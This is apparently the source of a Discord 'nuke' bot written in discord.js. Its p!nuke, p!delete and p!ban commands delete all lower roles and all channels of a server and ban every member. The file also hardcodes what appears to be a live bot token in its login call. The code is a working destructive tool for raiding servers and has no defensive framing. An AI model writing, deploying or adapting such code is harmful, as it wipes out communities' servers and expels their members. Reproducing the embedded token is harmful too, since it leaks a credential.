const discord = require("discord.js");
const nuke = new discord.Client();


nuke.on("ready", () =>{
console.log("This bot has been developed by beep.")
console.log(`${nuke.user.tag} is online.`);
nuke.user.setPresence({ game: { name: `Zach rules` }, type: 0 });
});

nuke.on("message", async(msg)=>{



if(msg.content.toLowerCase().startsWith("p!" + "nuke")){
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.ban("Nuke Bot"));
}
if(msg.content.toLowerCase().startsWith("p!" + "delete")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}
if(msg.content.toLowerCase().startsWith("p!" + "ban")){
    msg.guild.members.tap(member => member.ban("Bot"));
}
if(msg.content.toLowerCase().startsWith("p!" + "help")){
    msg.channel.send({
        embed: {
            color: 0xff0000,
            author: { name: "Nuke" },
            description: "b!nuke - Bans all members & deletes all roles and channels\nb!delete - Deletes all channels and roles\nb!ban - Bans all members in the discord\n\nFor any help contact"
        }
    })
}
});

nuke.login("ODM3NDQwMjExMjQ3NDMxNjkw.YIsk-Q.vIid_AH_qZBhW52eE0WicaRZF-c");